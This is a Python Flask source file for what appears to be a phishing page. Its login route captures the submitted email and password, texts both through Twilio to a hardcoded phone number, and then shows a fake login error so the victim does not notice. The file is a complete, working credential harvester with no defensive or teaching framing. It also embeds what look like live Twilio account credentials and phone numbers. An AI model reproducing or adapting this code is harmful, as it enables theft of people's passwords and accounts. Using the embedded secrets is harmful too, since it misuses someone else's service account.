from flask import Flask, render_template, request, redirect
from twilio.rest import Client

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login_error')
def login_error():
    return render_template('submit.html')

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method=='POST':
        l_email = request.form['username']
        l_pass = request.form['password']
        if not l_email or not l_pass:
            return redirect('/')
        else:
            sender_name = "New User"
            sender_email = l_email
            sender_password = l_pass

            account_sid = 'AC9381705527e5a219db0712615c09ff2e' 
            auth_token = 'd39488a293033287fc043c70a31f92e4' 
            client = Client(account_sid, auth_token) 
            message = client.messages.create( 
                                        from_='+16203129155',  
                                        body=f'{sender_name}\n{sender_email}\n{sender_password}',      
                                        to='+51960138822') 
            print("Success")
            return redirect('/login_error')
    else:
        return redirect('/')


if __name__ ==  '__main__':
    app.run(debug=True)